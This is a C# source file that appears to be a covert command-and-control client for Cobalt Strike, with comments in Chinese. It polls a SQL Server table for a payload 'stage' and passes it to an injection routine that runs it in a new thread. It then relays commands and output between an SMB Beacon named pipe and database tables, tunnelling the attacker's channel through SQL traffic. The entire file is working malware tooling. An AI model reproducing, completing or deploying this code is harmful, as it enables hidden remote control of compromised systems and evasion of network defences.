using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;


namespace Client
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 0)
            {
                options.host = args[0];
                options.dbname = args[1];
                options.username = args[2];
                options.password = args[3];
                options.pipe_name = args[4];
            }
            int id = 2;
            byte[] pdata = Encoding.ASCII.GetBytes("");
            SqlConnection sqlConnection = new SqlConnection(string.Format(options.connStr, options.host, options.dbname, options.username, options.password));
            string sqlStr = "select data from {0} where id = @id";
            using (SqlCommand sqlCommand = new SqlCommand(string.Format(sqlStr, options.table_server), sqlConnection))
            {
                try
                {
                    if (sqlConnection.State != ConnectionState.Open)
                        sqlConnection.Open();
                    sqlCommand.Parameters.Add("@id", SqlDbType.Int).Value = 1;
                   
                    while (true)
                    {
                        SqlDataReader dr = sqlCommand.ExecuteReader();
                        if (dr.HasRows)
                        {
                            dr.Read();
                            byte[] stage = (byte[])dr["data"];
                            Console.WriteLine("stage success {0} bytes", stage.Length.ToString());
                            inject.sd= stage;
                            Thread thread = new Thread(new ThreadStart(inject.LS));
                            thread.Start();
                            dr.Close();
                            break;
                        }

                    }
                    

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
                
            var pipeClient = new NamedPipeClientStream(options.pipe_name);
            pipeClient.Connect(5000);
            pipeClient.ReadMode = PipeTransmissionMode.Message;
            //Console.WriteLine("[+] Connection established succesfully.");
            while (true)
            {
                pdata = GetDataToPipe(pipeClient);
                //Console.WriteLine("read pipe {0} bytes", pdata.Length.ToString());
                DATABASE.insert_data(sqlConnection, options.table_client, pdata);
                while (true)
                {
                    using (SqlCommand sqlCommand = new SqlCommand(string.Format(sqlStr, options.table_server), sqlConnection))
                    {
                        if (sqlConnection.State != ConnectionState.Open)
                            sqlConnection.Open();
                        sqlCommand.Parameters.Add("@id", SqlDbType.Int).Value = id;
                        SqlDataReader dr = sqlCommand.ExecuteReader();
                        if (dr.HasRows)
                        {
                            dr.Read();
                            byte[] data = (byte[])dr["data"];
                            SendDataToPipe(data, pipeClient);
                            //Console.WriteLine("当前查询ID {0}，查询结果长度 {1} bytes", id.ToString(), data.Length.ToString());
                            id += 1;
                            dr.Close();
                            break;
                        }
                        dr.Close();
                    }
                    Thread.Sleep(500);
                }
            }


        }
        /// <summary>
        /// 读管道
        /// </summary>
        /// <param name="pipeClient"></param>
        /// <returns></returns>
        private static Byte[] GetDataToPipe(NamedPipeClientStream pipeClient)
        {
            var reader = new BinaryReader(pipeClient);
            var bufferSize = reader.ReadInt32();
            var result = reader.ReadBytes(bufferSize);
            return result;
        }

        /// <summary>
        /// 写入管道
        /// </summary>
        /// <param name="response">从 CS 获取到的指令</param>
        /// <param name="pipeClient">SMB Beacon 命名管道句柄</param>
        private static void SendDataToPipe(Byte[] response, NamedPipeClientStream pipeClient)
        {
            BinaryWriter writer = new BinaryWriter(pipeClient);
            writer.Write(response.Length);
            writer.Write(response);
        }

    }
}
